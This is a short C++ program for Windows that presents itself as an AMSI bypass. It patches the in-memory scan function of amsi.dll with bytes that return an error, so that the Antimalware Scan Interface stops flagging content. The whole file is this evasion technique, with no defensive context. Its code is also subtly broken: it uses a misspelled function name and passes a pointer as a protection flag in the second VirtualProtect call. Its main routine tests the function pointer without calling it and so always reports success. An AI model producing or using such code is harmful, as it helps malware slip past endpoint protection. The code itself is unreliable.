#include<iostream>
#include<Windows.h>
using namespace std;


bool patchAmsi(){
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if(!hAmsi){
        cerr << "Failed to loadd the Library" << endl;
        return false;
    }
    FARPROC amsiScanAddr = GetProcAddress(hAmsi,"AmsiBufferScan");
    if(!amsiScanAddr){
        cerr << "Failed to fetch the scan address" <<  endl;
        return false;
    }
    BYTE patch[] = {
        0xB8,0x57,0x00,0x07,0x80,0xc3
    };
    DWORD oldprotect;
    if(!VirtualProtect(amsiScanAddr,sizeof(patch),PAGE_EXECUTE_READWRITE,&oldprotect)){
        cerr << "Failed to change the memory Protection of the scan buffer" << endl;
        return false;
    }
    memcpy(amsiScanAddr,patch,sizeof(patch));
    DWORD temp;
    VirtualProtect(amsiScanAddr,sizeof(patch),&oldprotect,&temp);

    cout << "[+] AmsiScan buffer Bypass successfully Done!!" << endl;
    return true;
}
int main(){
    if(patchAmsi){
        cout << "Amsi Bypass complete" << endl;
    }else{
        cout << "Amsi Bypass Failed " << endl;
    }
    return 0;
}
